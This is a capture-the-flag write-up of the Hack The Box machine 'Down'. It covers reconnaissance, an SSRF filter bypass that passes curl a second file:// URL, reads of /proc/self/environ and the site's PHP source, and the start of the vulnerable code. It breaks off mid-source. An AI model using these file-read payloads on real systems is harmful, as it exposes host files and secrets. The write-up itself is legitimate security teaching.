@@ -1,0 +1,679 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Down</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#htb-down">htb-down</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#ssrf">ssrf</a> <a class="post-tag" href="/tags#ffuf">ffuf</a> <a class="post-tag" href="/tags#burp">burp</a> <a class="post-tag" href="/tags#burp-repeater">burp-repeater</a> <a class="post-tag" href="/tags#curl">curl</a> <a class="post-tag" href="/tags#file-read">file-read</a> <a class="post-tag" href="/tags#parameter-injection">parameter-injection</a> <a class="post-tag" href="/tags#pwsm">pwsm</a> <a class="post-tag" href="/tags#source-code">source-code</a> <a class="post-tag" href="/tags#pswm-decryptor">pswm-decryptor</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-06-17T09:00:00+00:00" itemprop="datePublished">Jun 17, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/06/17/htb-down.html" style="color: #e6e6e6; text-decoration: none;">HTB: Down</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/down-cover.webp" type="image/webp"/>
+<img alt="Down" class="include_image" loading="lazy" src="/img/down-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Down has a website designed to check if a website is up. This presents an obvious SSRF, but to bypass filters and exploit it I’ll have to abuse curl’s feature of taking multiple URLs and pass a second URL with the file schema to read from the host.I’ll get access to the page source, and see there’s an expert mode that will make a raw TCP connection with netcat. I’ll use parameter injection there to get a shell. From there, I’ll dig into a pswm instance to get the next user’s password, and they have a simple sudo rule to root.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/666 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/down" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Down</a> <a href="https://hackthebox.com/machines/down" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-down.webp" type="image/webp"/> <img alt="Down" class="img-av" src="/icons/box-down.png"/></picture></a><br/><a href="https://hackthebox.com/machines/down" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1935366938143736130">14 Jun 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">14 Jun 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/> <a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.129.234.87
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-03 04:25 UTC
+Nmap scan report for 10.129.234.87
+Host is up (0.093s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-vv</span> <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.129.234.87
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-03 04:26 UTC
+...[snip]...
+Nmap scan report for 10.129.234.87
+Host is up, received echo-reply ttl 63 (0.092s latency).
+Scanned at 2025-05-03 04:26:02 UTC for 10s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9eTcP2DDxJHJ2uCdOmMRIPaoOhvMFXL33f1pZTIe0VTdeHRNYlpm2a2PumsO5t88M7QF3L3d6n1eRHTTAskGw=
+|   256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwLt0rmihlvq9pk6BmFhjTycNR54yApKIrnwI8xzYx/
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Is it down or just me?
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+...[snip]...
+Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds
+           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH and Apache</a> versions, the host is likely running Ubuntu 22.04 jammy (or maybe 22.10 kinetic).</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The website is designed to check if another website is up:</p>
+<picture>
+<source srcset="/img/image-20250502163054293.webp" type="image/webp"/>
+<img alt="image-20250502163054293" class="include_image" loading="lazy" src="/img/image-20250502163054293.png"/>
+</picture>
+<p>If I enter a site on the internet it just hangs for a minute and eventually reports:</p>
+<picture>
+<source srcset="/img/image-20250502163631287.webp" type="image/webp"/>
+<img alt="image-20250502163631287" class="include_image" loading="lazy" src="/img/image-20250502163631287.png"/>
+</picture>
+<p>If I host a webserver on my machine and give it my IP, it makes a request to my site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.234.87 - - [03/May/2025 04:40:08] "GET / HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>And shows it’s up:</p>
+<picture>
+<source srcset="/img/image-20250502163800416.webp" type="image/webp"/>
+<img alt="image-20250502163800416" class="include_image" loading="lazy" src="/img/image-20250502163800416.png"/>
+</picture>
+<p>Similarly, if I request <code class="language-plaintext highlighter-rouge">http://localhost</code>, it returns up:</p>
+<picture>
+<source srcset="/img/image-20250502163834335.webp" type="image/webp"/>
+<img alt="image-20250502163834335" class="include_image" loading="lazy" src="/img/image-20250502163834335.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers don’t show anything beyond Apache:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 02 May 2025 20:41:25 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.52 (Ubuntu)</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">739</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+</code></pre></div></div>
+<p>The 404 page is the <a href="/cheatsheets/404#apache--httpd">default Apache 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250502164100772.webp" type="image/webp"/>
+<img alt="image-20250502164100772" class="include_image" loading="lazy" src="/img/image-20250502164100772.png"/>
+</picture>
+<p>Looking at the logs in Burp Proxy of my interactions with the site, the POST requests submitting the form go to <code class="language-plaintext highlighter-rouge">index.php</code>, suggesting this is a PHP site. The main page loads as <code class="language-plaintext highlighter-rouge">/index.php</code> as well.</p>
+<p>If I look at the headers when the site sends a request to my server, I’ll see it’s using <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnnp</span> 80
+<span class="go">GET / HTTP/1.1
+Host: 10.10.14.79
+User-Agent: curl/7.81.0
+Accept: */*
+</span></code></pre></div></div>
+<p>That’s not surprising, as <a href="https://www.php.net/manual/en/book.curl.php">curl is integrated into PHP</a>.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.234.87 <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.234.87
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      275c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      278c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       27l       70w      739c http://10.129.234.87/index.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      319c http://10.129.234.87/javascript =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.87/javascript/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       93l      207w     1794c http://10.129.234.87/style.css
+</span><span class="feroxbuster-green">200</span><span class="go">      GET     1302l     7419w   578132c http://10.129.234.87/logo.png
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       27l       70w      739c http://10.129.234.87/
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      326c http://10.129.234.87/javascript/jquery =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.87/javascript/jquery/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET    10879l    44396w   288550c http://10.129.234.87/javascript/jquery/jquery
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     90015/90015   0s      </span><span class="feroxbuster-green">found</span><span class="go">:7       </span><span class="feroxbuster-red">errors</span><span class="go">:9      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   227/s   http://10.129.234.87/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   233/s   http://10.129.234.87/javascript/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   239/s   http://10.129.234.87/javascript/jquery/  
+</span></code></pre></div></div>
+<p>Nothing at all interesting. This looks very much like a one page site.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="port-scan-fail">Port Scan [Fail]</h3>
+<p>My first thought is to look for other open HTTP servers on the host that may only be only on localhost or maybe blocked by a firewall. I’ll set up a <code class="language-plaintext highlighter-rouge">ffuf</code> scan to brute force all possible ports. This is a bit tricky for two reasons:</p>
+<ul>
+<li>I have to include the <code class="language-plaintext highlighter-rouge">Content-Type</code> header, or the site doesn’t process the POST data and it returns the page with no results.</li>
+<li><code class="language-plaintext highlighter-rouge">ffuf</code> doesn’t have a <code class="language-plaintext highlighter-rouge">range</code> input the way that <code class="language-plaintext highlighter-rouge">wfuzz</code> did, so I have to make a wordlist of numbers to put in. I’ll use the <code class="language-plaintext highlighter-rouge">seq</code> command, and I like to use <a href="https://en.wikipedia.org/wiki/Process_substitution">process substitution</a> to do it inline. <code class="language-plaintext highlighter-rouge">&lt;( command )</code> tells <code class="language-plaintext highlighter-rouge">bash</code> to handle the output of <code class="language-plaintext highlighter-rouge">command</code> as if it were a file.</li>
+</ul>
+<p>The other args I’ll use are:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">-u http://10.129.234.87/index.php</code> - The URL to send to.</li>
+<li><code class="language-plaintext highlighter-rouge">-d url=http://%3A%2F%2Flocalhost:FUZZ</code> - The POST data, URL-encoded.</li>
+<li><code class="language-plaintext highlighter-rouge">-fr 'for everyone'</code> - Filter out responses with the string “for everyone” to get just the open ports.</li>
+</ul>
+<p>When getting this command working, I like to start with a small range that contains a port I know should work, like <code class="language-plaintext highlighter-rouge">-w &lt;(seq 75 85)</code>, and when I get the expected response, then expand it to the full range:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.129.234.87/index.php <span class="nt">-d</span> <span class="s1">'url=http%3A%2F%2Flocalhost:FUZZ'</span> <span class="nt">-w</span> &lt;<span class="o">(</span><span class="nb">seq </span>1 65535<span class="o">)</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-fr</span> <span class="s1">'for everyone'</span>
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.129.234.87/index.php
+ :: Wordlist         : FUZZ: /dev/fd/63
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : url=http%3A%2F%2Flocalhost:FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: for everyone
+________________________________________________
+
+80                      [Status: 200, Size: 1961, Words: 271, Lines: 54, Duration: 4523ms]
+:: Progress: [65535/65535] :: Job [1/1] :: 126 req/sec :: Duration: [0:10:07] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>Nothing.</p>
+<h3 id="file-read">File Read</h3>
+<h4 id="identify-filter">Identify Filter</h4>
+<p>The next thing I’ll try is if I can use the <code class="language-plaintext highlighter-rouge">file://</code> protocol instead of <code class="language-plaintext highlighter-rouge">http://</code> to read files on the host. I’ll send a POST request to Burp Repeater and give it a try:</p>
+<picture>
+<source srcset="/img/image-20250502170642263.webp" type="image/webp"/>
+<img alt="image-20250502170642263" class="include_image" loading="lazy" src="/img/image-20250502170642263.png"/>
+</picture>
+<p>It fails.</p>
+<h4 id="understand-filter">Understand Filter</h4>
+<p>I’ll poke at the filter a bit more to get a feel for how it works. It seems to just be checking the start of the string for “http://” and “https://”. When I add “http:/” to the front, it gets filtered:</p>
+<picture>
+<source srcset="/img/image-20250502171035039.webp" type="image/webp"/>
+<img alt="image-20250502171035039" class="include_image" loading="lazy" src="/img/image-20250502171035039.png"/>
+</picture>
+<p>One more “/” and it gets past:</p>
+<picture>
+<source srcset="/img/image-20250502171111521.webp" type="image/webp"/>
+<img alt="image-20250502171111521" class="include_image" loading="lazy" src="/img/image-20250502171111521.png"/>
+</picture>
+<h4 id="curl">curl</h4>
+<p>An interesting trick about <code class="language-plaintext highlighter-rouge">curl</code> is that if I give it multiple URLs, it will fetch both. For example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> http://localhost/test1 http://localhost/test2
+<span class="go">&lt;!DOCTYPE HTML&gt;
+&lt;html lang="en"&gt;
+    &lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;title&gt;Error response&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Error response&lt;/h1&gt;
+        &lt;p&gt;Error code: 404&lt;/p&gt;
+        &lt;p&gt;Message: File not found.&lt;/p&gt;
+        &lt;p&gt;Error code explanation: 404 - Nothing matches the given URI.&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+&lt;!DOCTYPE HTML&gt;
+&lt;html lang="en"&gt;
+    &lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;title&gt;Error response&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Error response&lt;/h1&gt;
+        &lt;p&gt;Error code: 404&lt;/p&gt;
+        &lt;p&gt;Message: File not found.&lt;/p&gt;
+        &lt;p&gt;Error code explanation: 404 - Nothing matches the given URI.&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>There’s two 404 pages there, and at my Python webserver, two failed requests:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">127.0.0.1 - - [03/May/2025 05:53:23] code 404, message File not found
+127.0.0.1 - - [03/May/2025 05:53:23] "GET /test1 HTTP/1.1" 404 -
+127.0.0.1 - - [03/May/2025 05:53:23] code 404, message File not found
+127.0.0.1 - - [03/May/2025 05:53:23] "GET /test2 HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<h4 id="file-read-1">File Read</h4>
+<p>With that in mind, I’ll try a space between a legit URL and a <code class="language-plaintext highlighter-rouge">file://</code> URL:</p>
+<picture>
+<source srcset="/img/image-20250502173332836.webp" type="image/webp"/>
+<img alt="image-20250502173332836" class="include_image" loading="lazy" src="/img/image-20250502173332836.png"/>
+</picture>
+<p>It works! I can also just break the first URL to only get the file read:</p>
+<picture>
+<source srcset="/img/image-20250502173410449.webp" type="image/webp"/>
+<img alt="image-20250502173410449" class="include_image" loading="lazy" src="/img/image-20250502173410449.png"/>
+</picture>
+<p>That’s kind of like doing this:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> http:// file:///etc/hostname
+<span class="go">hacky
+</span></code></pre></div></div>
+<h3 id="filesystem-enumeration">Filesystem Enumeration</h3>
+<p>The current process is a <code class="language-plaintext highlighter-rouge">curl</code> process with <code class="language-plaintext highlighter-rouge">-s</code> and both URLs:</p>
+<picture>
+<source srcset="/img/image-20250502173554422.webp" type="image/webp"/>
+<img alt="image-20250502173554422" class="include_image" loading="lazy" src="/img/image-20250502173554422.png"/>
+</picture>
+<p>I’ll switch to command line. I can get the environment variables for the current process (and with some <code class="language-plaintext highlighter-rouge">bash</code> to clean it up):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="s1">'http://10.129.234.87/index.php'</span> <span class="nt">-d</span> <span class="s1">'url=http:// file:///proc/self/environ'</span> <span class="nt">-o-</span> <span class="nt">-s</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s:.*&lt;pre&gt;\(.*\)&lt;/pre&gt;.*:\1:p'</span> | <span class="nb">tr</span> <span class="s1">'\000'</span> <span class="s1">'\n'</span>
+<span class="go">APACHE_RUN_DIR=/var/run/apache2
+SYSTEMD_EXEC_PID=864
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=8:21130
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+INVOCATION_ID=0320944a871242e8aea7f3bd1efad651
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/var/www/html
+</span></code></pre></div></div>
+<p>I’ll grab the page source with <code class="language-plaintext highlighter-rouge">-d 'url=http:// file:///proc/self/cwd/index.php'</code>. The results are HTML encoded, so I’ll copy them into Burp Decoder and decode:</p>
+<picture>
+<source srcset="/img/image-20250502174313421.webp" type="image/webp"/>
+<img alt="image-20250502174313421" class="include_image" loading="lazy" src="/img/image-20250502174313421.png"/>
+</picture>
+<h3 id="source-analysis">Source Analysis</h3>
+<h4 id="identify-expert-mode">Identify Expert Mode</h4>
+<p>Right towards the top of the <code class="language-plaintext highlighter-rouge">body</code> there’s an <code class="language-plaintext highlighter-rouge">if</code> branch:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span>
+
+    <span class="nt">&lt;header&gt;</span>
+        <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/logo.png"</span> <span class="na">alt=</span><span class="s">"Logo"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h2&gt;</span>Is it down or just me?<span class="nt">&lt;/h2&gt;</span>
+    <span class="nt">&lt;/header&gt;</span>
+
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+
+<span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'tcp'</span> <span class="p">)</span> <span class="p">{</span>
+  <span class="k">echo</span> <span class="s1">'&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt;
+        &lt;form id="urlForm" action="index.php?expertmode=tcp" method="POST"&gt;
+            &lt;input type="text" id="url" name="ip" placeholder="Please enter an IP." required&gt;&lt;br&gt;
+            &lt;input type="number" id="port" name="port" placeholder="Please enter a port number." required&gt;&lt;br&gt;
+            &lt;button type="submit"&gt;Is it refused?&lt;/button&gt;
+        &lt;/form&gt;'</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="k">echo</span> <span class="s1">'&lt;h1&gt;Is that website down, or is it just you?&lt;/h1&gt;
+        &lt;form id="urlForm" action="index.php" method="POST"&gt;
+            &lt;input type="url" id="url" name="url" placeholder="Please enter a URL." required&gt;&lt;br&gt;
+            &lt;button type="submit"&gt;Is it down?&lt;/button&gt;
+        &lt;/form&gt;'</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>It’s looking for an <code class="language-plaintext highlighter-rouge">expertmode</code> parameter with the value “tcp”! I’ll try adding <code class="language-plaintext highlighter-rouge">?expertmode=tcp</code> to the end of the URL and a different text does load:</p>
+<picture>
+<source srcset="/img/image-20250502174557277.webp" type="image/webp"/>
+<img alt="image-20250502174557277" class="include_image" loading="lazy" src="/img/image-20250502174557277.png"/>
+</picture>
+<h4 id="curl-code">curl Code</h4>
+<p>The code that handles POST requests looks like:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'tcp'</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'port'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The code that handles <code class="language-plaintext highlighter-rouge">curl</code> looks about like I would expect:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nv">$url</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'|^https?://|'</span><span class="p">,</span><span class="nv">$url</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$rc</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+    <span class="nv">$ec</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="s2">"/usr/bin/curl -s </span><span class="nv">$url</span><span class="s2">"</span><span class="p">);</span>
+    <span class="nb">exec</span><span class="p">(</span><span class="nv">$ec</span> <span class="mf">.</span> <span class="s2">" 2&gt;&amp;1"</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$rc</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s1">'&lt;div class="output" id="outputSection"&gt;'</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="nv">$rc</span> <span class="o">===</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"&lt;font size=+1&gt;It is up. It's just you! =␝&lt;/font&gt;&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+      <span class="k">echo</span> <span class="s1">'&lt;p id="outputDetails"&gt;&lt;pre&gt;'</span><span class="mf">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$output</span><span class="p">))</span><span class="mf">.</span><span class="s1">'&lt;/pre&gt;&lt;/p&gt;'</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
